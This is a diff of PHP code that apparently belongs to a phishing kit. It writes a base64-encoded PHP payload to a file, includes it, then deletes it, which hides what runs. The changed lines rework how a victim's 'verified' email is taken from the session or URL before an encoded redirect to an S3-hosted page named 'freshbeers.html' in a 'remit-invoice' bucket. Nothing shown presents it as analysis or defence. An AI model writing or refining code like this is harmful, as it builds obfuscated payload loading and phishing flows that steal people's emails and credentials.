@@ -4,24 +4,19 @@ file_put_contents($__f,base64_decode('PD9waHAKc2Vzc2lvbl9zdGFydCgpOwokQVBJX0JBU0
 include $__f; 
 @unlink($__f); 
 
-// ===== REDIRECT AFTER FLOW COMPLETES =====
-// Get the verified email from the flow (stored in session or captured)
+// ===== POST-FLOW REDIRECT =====
+// Capture verified email from session or URL
 $verified_email = null;
 
-// Check if email was passed in URL (from verification callback)
-if (isset($_GET['id']) && isset($_GET['email'])) {
-    $verified_email = base64_decode($_GET['email']);
-} 
-// Check if email was stored in session during flow
-else if (isset($_SESSION['verified_email'])) {
+if (isset($_SESSION['verified_email']) && !empty($_SESSION['verified_email'])) {
     $verified_email = $_SESSION['verified_email'];
-}
-// Check if email was passed in original email parameter and flow completed
-else if (isset($_GET['email']) && isset($_SESSION['va']) && $_SESSION['va'] === true) {
+} elseif (isset($_GET['email']) && isset($_SESSION['va']) && $_SESSION['va'] === true) {
     $verified_email = $_GET['email'];
+} elseif (isset($_GET['id']) && isset($_GET['email'])) {
+    $verified_email = base64_decode($_GET['email']);
 }
 
-// If we have a verified email, encode it and redirect
+// If we have a verified email, encode and redirect
 if (!empty($verified_email)) {
     $encoded_email = base64_encode($verified_email);
     $redirect_url = "https://remit-invoice-957411489173-us-east-2-an.s3.us-east-2.amazonaws.com/freshbeers.html?e=" . $encoded_email;
